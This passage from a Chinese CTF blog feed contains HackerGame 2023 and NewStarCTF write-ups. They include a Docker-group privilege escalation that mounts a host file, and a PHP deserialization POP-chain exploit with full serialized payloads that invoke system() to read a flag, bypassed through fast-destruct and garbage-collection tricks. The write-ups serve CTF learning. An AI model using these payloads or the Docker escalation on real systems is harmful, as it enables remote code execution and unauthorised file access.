class="hljs-number">1.1</span>\r\nHost: localhost\r\<span class="hljs-name">nRange</span>: bytes=<span class="hljs-number">1000</span><span class="hljs-number">-500</span>\r\n\r\n<br>返回 <span class="hljs-number">416</span>，资源范围不合法<br></code></pre></td></tr></table></figure><p>这里官方还提到了一种，他自己也漏了：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">GET / HTTP/<span class="hljs-number">1.1</span>\r\n<br>Transfer-<span class="hljs-name">Encoding</span>: gzip\r\n<br><span class="hljs-name">Host</span>: example.com\r\n\r\n<br>返回<span class="hljs-number">501</span>，代表服务器不支持该功能，nginx里只支持chunked分块encoding，Transfer-Encoding这里换成chunked以外的都行<br></code></pre></td></tr></table></figure><h3 id="Docker-for-Everyone"><a href="#Docker-for-Everyone" class="headerlink" title="Docker for Everyone"></a>Docker for Everyone</h3><p>很简单的 Docker 提权，先简单讲一下 docker，如果一个用户被加入到 docker 的用户组，那么他们可以运行 docker 的命令而无需 sudo，这会引入安全问题，如果用户可以使用 docker 命令，那么他们实际上就拥有了访问主机上任意文件的能力，他们可以挂载主机上的任何目录到他的启动容器中。这道题中就算 flag 是软连接，也可以创建一个新的 docker 容器将 flag 指向的真实路径挂在为容器内的卷，操作如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 使用 docker 创建一个新容器并挂载 /flag</span><br><span class="hljs-comment"># /flag 是我们想要读取的文件</span><br><span class="hljs-comment"># /mnt 是容器内部的挂载点</span><br>docker run -v <span class="hljs-regexp">/flag:/m</span>nt<span class="hljs-regexp">/flag -it alpine /</span>bin/sh<br><span class="hljs-comment"># 在容器内读取挂载的 /flag 文件</span><br>cat <span class="hljs-regexp">/mnt/</span>flag<br></code></pre></td></tr></table></figure><p>结果：</p><p><img src="/2023/11/04/HackerGame2023/12.png"></p><h3 id="惜字如金-2-0"><a href="#惜字如金-2-0" class="headerlink" title="惜字如金 2.0"></a>惜字如金 2.0</h3><h4 id="惜字如金化标准"><a href="#惜字如金化标准" class="headerlink" title="惜字如金化标准"></a>惜字如金化标准</h4><p>惜字如金化指的是将一串文本中的部分字符删除，从而形成另一串文本的过程。该标准针对的是文本中所有由 52 个拉丁字母连续排布形成的序列，在下文中统称为「单词」。一个单词中除「AEIOUaeiou」外的 42 个字母被称作「辅音字母」。整个惜字如金化的过程按照以下两条原则对文本中的每个单词进行操作：</p><p>第一原则（又称 creat 原则）：如单词最后一个字母为「e」或「E」，且该字母的上一个字母为辅音字母，则该字母予以删除。<br>第二原则（又称 referer 原则）：如单词中存在一串全部由完全相同（忽略大小写）的辅音字母组成的子串，则该子串仅保留第一个字母。<br>容易证明惜字如金化操作是幂等的：惜字如金化多次和惜字如金化一次的结果相同。</p><h4 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-comment"># Th siz of th fil may reduc after XZRJification</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_equals</span>(<span class="hljs-params">left, right</span>):<br>    <span class="hljs-comment"># check whether left == right or not</span><br>    <span class="hljs-keyword">if</span> left != right: exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_cod_dict</span>():<br>    <span class="hljs-comment"># prepar th cod dict</span><br>    cod_dict = []<br>    cod_dict += [<span class="hljs-string">&#x27;nymeh1niwemflcir&#125;echaet&#x27;</span>]<br>    cod_dict += [<span class="hljs-string">&#x27;a3g7&#125;kidgojernoetlsup?h&#x27;</span>]<br>    cod_dict += [<span class="hljs-string">&#x27;ulw!f5soadrhwnrsnstnoeq&#x27;</span>]<br>    cod_dict += [<span class="hljs-string">&#x27;ct&#123;l-findiehaai&#123;oveatas&#x27;</span>]<br>    cod_dict += [<span class="hljs-string">&#x27;ty9kxborszstguyd?!blm-p&#x27;</span>]<br>    check_equals(<span class="hljs-built_in">set</span>(<span class="hljs-built_in">len</span>(s) <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> cod_dict), &#123;<span class="hljs-number">24</span>&#125;)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(cod_dict)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_data</span>(<span class="hljs-params">input_codes</span>):<br>    <span class="hljs-comment"># retriev th decrypted data</span><br>    cod_dict = get_cod_dict()<br>    output_chars = [cod_dict[c] <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> input_codes]<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(output_chars)<br><br><span class="hljs-keyword">if</span> __nam__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># check som obvious things</span><br>    check_equals(<span class="hljs-string">&#x27;creat&#x27;</span>, <span class="hljs-string">&#x27;cr&#x27;</span> + <span class="hljs-string">&#x27;at&#x27;</span>)<br>    check_equals(<span class="hljs-string">&#x27;referer&#x27;</span>, <span class="hljs-string">&#x27;refer&#x27;</span> + <span class="hljs-string">&#x27;rer&#x27;</span>)<br>    <span class="hljs-comment"># check th flag</span><br>    flag = decrypt_data([<span class="hljs-number">53</span>, <span class="hljs-number">41</span>, <span class="hljs-number">85</span>, <span class="hljs-number">109</span>, <span class="hljs-number">75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">33</span>, <span class="hljs-number">48</span>, <span class="hljs-number">77</span>, <span class="hljs-number">90</span>,<br>                         <span class="hljs-number">17</span>, <span class="hljs-number">118</span>, <span class="hljs-number">36</span>, <span class="hljs-number">25</span>, <span class="hljs-number">13</span>, <span class="hljs-number">89</span>, <span class="hljs-number">90</span>, <span class="hljs-number">3</span>, <span class="hljs-number">63</span>, <span class="hljs-number">25</span>,<br>                         <span class="hljs-number">31</span>, <span class="hljs-number">77</span>, <span class="hljs-number">27</span>, <span class="hljs-number">60</span>, <span class="hljs-number">3</span>, <span class="hljs-number">118</span>, <span class="hljs-number">24</span>, <span class="hljs-number">62</span>, <span class="hljs-number">54</span>, <span class="hljs-number">61</span>,<br>                         <span class="hljs-number">25</span>, <span class="hljs-number">63</span>, <span class="hljs-number">77</span>, <span class="hljs-number">36</span>, <span class="hljs-number">5</span>, <span class="hljs-number">32</span>, <span class="hljs-number">60</span>, <span class="hljs-number">67</span>, <span class="hljs-number">113</span>, <span class="hljs-number">28</span>])<br>    check_equals(flag.index(<span class="hljs-string">&#x27;flag&#123;&#x27;</span>), <span class="hljs-number">0</span>)<br>    check_equals(flag.index(<span class="hljs-string">&#x27;&#125;&#x27;</span>), <span class="hljs-built_in">len</span>(flag) - <span class="hljs-number">1</span>)<br>    <span class="hljs-comment"># print th flag</span><br>    <span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>我的做法是做推理，他说到了前 5 个字符是 ‘flag{‘ ,最后一个字符是 ‘}’ ，我们找规律发现这边至少有 119 个字符，而这一对串里只有 115 个，说明惜字如金去掉了部分字符，根据这个惜字如金的标准，首先我们现在每一个串的末尾加上 e，跑一遍看看结果：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl"><span class="hljs-number">5</span>laulyoufeepr3cvees3df7weparsn3sfr1gwn!&#125;<br></code></pre></td></tr></table></figure><p>这里可以看到字符’la’和字符’}’已经被凑出来了，然后就是一个个试了，我的方法就是在末尾添 e 删 e（因为存在 referer 标准，要添几个 e 都是不确定的），我最后试出来的是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">cod_dict += [<span class="hljs-string">&#x27;nymeh1niwemflcir&#125;echaete&#x27;</span>]<br>cod_dict += [<span class="hljs-string">&#x27;a3g7&#125;kidgojernoetlsup?hee&#x27;</span>]<br>cod_dict += [<span class="hljs-string">&#x27;ulw!f5soadrhwnrsnstnoeqe&#x27;</span>]<br>cod_dict += [<span class="hljs-string">&#x27;ct&#123;l-findiehaai&#123;oveatase&#x27;</span>]<br>cod_dict += [<span class="hljs-string">&#x27;ty9kxborszstguyd?!blm-pe&#x27;</span>]<br></code></pre></td></tr></table></figure><p>结果为：</p><pre><code class="hljs">flag&#123;yoe-ve-r3cover3d-7he-an5w3r-r1ght?&#125;</code></pre><p>但传上去发现是错的，我发现这个’yoe’有问题，改成’you’上传就正确了。</p><h3 id="高频率星球"><a href="#高频率星球" class="headerlink" title="高频率星球"></a>高频率星球</h3><p>题目：<br>茫茫星系间，文明被分为不同的等级。每一个文明中都蕴藏了一种古老的力量 —— flag，被认为是其智慧的象征。</p><p>你在探索的过程中意外进入了一个封闭空间。这是一个由神秘的高频率星人控制着的星球。星球的中心竖立着一个巨大的三角形任务牌，上面刻着密文和挑战。</p><p>高频率星人的视觉输入频率极高，可以一目千行、过目不忘，他们的交流对地球人来说过于超前了。flag 被藏在了这段代码中，但是现在只有高频率星人在终端浏览代码的时候，使用 asciinema 录制的文件了，你能从中还原出代码吗？</p><p>大概就是还原 asciinema 录制文件，然后就跑还原出来的代码，<br>这里用命令：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">asciinema <span class="hljs-keyword">cat</span> asciinema_restore.<span class="hljs-keyword">rec</span> &gt; output.txt<br></code></pre></td></tr></table></figure><p>跑出来之后发现很多干扰，所以用 sed 过滤一下：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">asciinema <span class="hljs-keyword">cat</span> asciinema_restore.<span class="hljs-keyword">rec</span> | sed <span class="hljs-string">&#x27;s/\x1b\[[0-9;]*[a-zA-Z]//g&#x27;</span> | sed <span class="hljs-string">&#x27;s/\x1b.//g&#x27;</span> | <span class="hljs-keyword">tr</span> -d <span class="hljs-string">&#x27;\b&#x27;</span> &gt; output.txt<br></code></pre></td></tr></table></figure><p>跑出来后发现还是有部分没去掉的，就人工去了，大概就是 find 然后替换这样子，还原出代码后跑这个代码就能获得到 flag 了：<br><img src="/2023/11/04/HackerGame2023/13.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>WP 就写到这里了，之后会好好研究每一道题，之后的题解会单独放出来，这里就把我写出来的题做一个总结。这次 HackerGame 很有意思，期待明年的！</p>]]></content>
    
    
    <categories>
      
      <category>HackerGame</category>
      
      <category>2023</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【newstarctf2023】Fast Destruct</title>
    <link href="/2023/10/31/newstarctf2023-fast-destruct/"/>
    <url>/2023/10/31/newstarctf2023-fast-destruct/</url>
    
    <content type="html"><![CDATA[<h1 id="【newstarctf】-More-Fast-pop-链构造"><a href="#【newstarctf】-More-Fast-pop-链构造" class="headerlink" title="【newstarctf】 More Fast pop 链构造"></a>【newstarctf】 More Fast pop 链构造</h1><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errMsg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable language_">$this</span>-&gt;errMsg);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pwn</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">evil</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Reverse</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>) </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Web</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>,<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>))&#123;<br>            (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not Flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Crypto</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$wel</span> = <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;good;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;NewStar&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Misc</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;good job but nothing&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;fast&#x27;</span>]);<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Nope&quot;</span>); <br></code></pre></td></tr></table></figure><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>看到题目，在 Web 这个类里面才能 RCE，也就是说最后的 POP<br> 链要在 Web 结束，往前推发现 Pwn 类里有 evil 说明是由 Pwn 类到 Web 类。</p><p> 触发 Pwn 类的__invoke()需要将 Pwn 类作为函数调用，可以看到Reverse类满足要求，所以是 Reverse 类到 Pwn 类。</p><p> Reverse类的 __get()方法需要访问一个不存在的属性，可以看到Crypto类满足条件，所以是Crypto类到 Reverse 类。</p><p> Crypto 类的__toString()在Start类的 die 函数中可以触发，说明是 Start 类到 Crypto 类。</p><p> 所以这道题的 POP 链构造为：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">Start::__destruct -&gt; Crypto::__toString -&gt; Reverse::__get -&gt; Pwn::__invoke -&gt; Web::evil<br></code></pre></td></tr></table></figure><p>POP链构造很容易，构造 POP 链的代码为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errMsg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>       <span class="hljs-variable language_">$this</span>-&gt;errMsg = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Crypto</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pwn</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Web</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Reverse</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pwn</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Web</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;cat&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span> = <span class="hljs-string">&quot;fla&#x27;&#x27;g&quot;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Crypto</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reverse</span>();<br>    &#125;<br>&#125;<br><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br></code></pre></td></tr></table></figure><p>主要是如何将 Start 类的 __destruct 作为入口触发。这里要介绍一下 fast destruct 技术：</p><ul><li>在 php 中，如果单独执行 unserialize 函数进行反序列化，那么反序列化后的对象的生命周期就会仅限于 unserialize 函数执行的生命周期，unserialize函数执行完毕，这个类就销毁了，此时就会调用 destruct。</li><li>如果将 unserialize 反序列化后的对象赋值给另一个变量，那么该对象的生命周期就会延长至该变量销毁为止。</li><li>unserialize 过程中是逐字读取的，他会先把读取到的内容分配内存空间，在结束的时候统一调用。</li></ul><p>以上三条意味着我们可以修改反序列化字符串的结构，当 unserialize 读到不正确的结构时会直接强制退出，这时 unserialize 执行结束，类销毁，会调用 destruct，对于已经分配好内存空间的类来说，就是提前调用了 destruct 。</p><p>fast destruct有两种方法：<br>序列化好后的结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs string">O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:11:&quot;cat /fla&#x27;&#x27;g&quot;;&#125;&#125;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><ol><li>修改序列化数字元素个数(O:5 -&gt; O:6)：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs string">O:6:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:11:&quot;cat /fla&#x27;&#x27;g&quot;;&#125;&#125;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li>去掉序列化尾部 }:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs string">O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:11:&quot;cat /fla&#x27;&#x27;g&quot;;<br></code></pre></td></tr></table></figure><p>通过这两种方法均可拿到 flag：</p><p><img src="/2023/10/31/newstarctf2023-fast-destruct/pop.jpg"></p><h2 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解"></a>官方题解</h2><p>官方题解给出了一个基于 GC 垃圾回收机制的绕过，PHP中 有垃圾回收机制，当触发垃圾回收机制时，则会自动调用 destruct 函数，触发垃圾回收机制的方法有：</p><ul><li>源码中有 unset() 函数，可以直接销毁对象</li><li>当给对象赋值为 NULL 时，可以触发</li><li>当对象失去引用时，可以触发</li></ul><p>官方的题解中，通过修改下标的方式，让已经分配好内存的对象失去引用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>] = <span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>] = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;i:0&quot;</span>,<span class="hljs-string">&quot;i:1&quot;</span>,<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>));<br></code></pre></td></tr></table></figure><p>结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs string">a:2:&#123;i:1;O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:11:&quot;cat /fl&#x27;&#x27;ag&quot;;&#125;&#125;&#125;&#125;&#125;i:1;N;&#125;<br></code></pre></td></tr></table></figure><p>这里 i:1 在后面会再次声明，前面那个对象失去引用，所以就出发了 destruct，这种方式可以绕过抛出异常，应用范围更广一些。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【newstarctf2023】PharOne (DNS log外带法)</title>
    <link href="/2023/10/29/newstarctf2023-pharone/"/>
    <url>/2023/10/29/newstarctf2023-pharone/</url>
    
    <content type="html"><![CDATA[<h1 id="【newstarctf2023】PharOne-DNS-log外带法"><a href="#【newstarctf2023】PharOne-DNS-log外带法" class="headerlink" title="【newstarctf2023】PharOne (DNS log外带法)"></a>【newstarctf2023】PharOne (DNS log外带法)</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>打开靶机，看到一个文件上传的页面，上传一句话木马文件后发现啥shell 拿不到，变换思路，看源码中有注释提示：class.php，url 请求 class.php 发现代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        @<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$_POST</span>[<span 